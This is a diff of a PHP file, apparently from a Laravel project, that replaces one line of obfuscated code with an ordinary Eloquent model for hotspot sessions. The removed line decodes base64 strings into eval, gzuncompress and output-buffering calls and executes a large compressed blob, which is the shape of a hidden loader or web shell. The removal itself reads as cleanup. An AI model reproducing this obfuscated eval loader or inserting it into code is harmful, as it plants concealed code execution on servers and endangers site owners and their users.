@@ -1,1 +1,41 @@
-<?php $_='a742ec44';$__='printf'; $_____='b2JfZW5kX2NsZWFu'; $______________='cmV0dXJuICAgIGV2YWwoJF8pOw=='; $__________________='X19vbWVnYQ=='; $______=' Z3p1bmNvbXByZXNz';$___=' b2Jfc3RhcnQ=';$____='b2JfZ2V0X2NvbnRlbnRz';$__= 'base64_decode' ; $______=$__($______); if(!function_exists('__omega')){function __omega($_oA,$_oS){return eval("return function($_oA){{$_oS}};");}}$__________________=$__($__________________); $______________=$__($______________); $__________=$__________________('$_',$______________); $_____=$__($_____);$____=$__($____);$___=$__($___); $_='eNp9VNtuozAQfd+v4KESrbQPXJptUJSHQAOBbKlCGmx4qbCdkIshdMkF+PodaG5d1EVyPDGeM2eGMyMIn8/d+/Xpi90u6UqLORF7d58H2Z9VuluIvR/Czf2+IGJZOxDkp8Gk3xeF6+szXh9MkSa+xLCztw2ds8TMx4a3wHI3ez3WTsJX0HdBaJxIlM9/Pb6zOd2yudhrUXyebF0j6SwhekUtcx1OdZ2OdPqGtE2Iiur1KI2fJ5lMlVk8RUXOkJyRxJRCvxgG2FsGiVmBbRJLKxjy98wsrAC5ElGdLMQunVpm5SXmmllaOX/LXSP1K4jhEKuQCeJ7wOB46C2ZZa4C7ILt50Q15RB1JDyUD6Hl5ycOawJYtNRtonrAVZNmCnBW+IGsdD4feZwkXmWffOD+E+QW28YgZoBrD5dLKoXLQPUONN08NXmvBvX7w3h1sePxSp9F1iyu+RDYgVNFFDereYaGrkbY29ojbws57IgCMY3Hq28sjesd1oc91JUA2zFVvTJCnfTMxTa2h7NNR86BWT7Uxt/YhicFyMnD6UCzDbY954hVl1PVzYjSqZwK6neJ0f34Es9sOC3ZqI7nyIBZ1TwDPIEcHG5b8pKqL00+EWL7z1j/5w5+ZYA3N7Xpnmz9SBNNCuE7h2gSO1aYwfcELRTcfpZidLxg1SslyFw75fGCUy9H4cfWmQraAIEHSObt+wXobrcAnaURekx/D/6JYfF9BF1EE562ff0S+Jbtcxfqoy8iNGnhBQroxdTWkWXmxPL3oTL7LmZOFJYRDh2cFJ1vedf9IGucKi9tHKgPBi0HJc2vOqkXOwaY75peUPimXS9XAl3KtO2nENUH7n6JFRf6YXbRH256UAIdwdC4GTTXUdPs96d/D83kujl76J1vNof3Yv0r/rxc/zqETjj3tzPn4aH3F3EAooM='; $___();$__________($______($__($_))); $________=$____(); $_____(); echo $________;
+<?php
+
+namespace App\Models;
+
+use Illuminate\Database\Eloquent\Factories\HasFactory;
+use Illuminate\Database\Eloquent\Model;
+
+class HotspotSession extends Model
+{
+    use HasFactory;
+
+    /**
+     * The table associated with the model.
+     *
+     * @var string
+     */
+    protected $table = 'hotspot_sessions';
+
+    /**
+     * The attributes that are mass assignable.
+     *
+     * @var array
+     */
+    protected $fillable = [
+        'mac',
+        'ip',
+        'username',
+        'link_login',
+        'link_orig',
+        'error',
+        'chap_id',
+        'chap_challenge',
+        'link_login_only',
+        'link_orig_esc',
+        'mac_esc',
+        'payment_id',
+        'requestid',
+        'status',
+        'voucher_code'
+    ];
+}
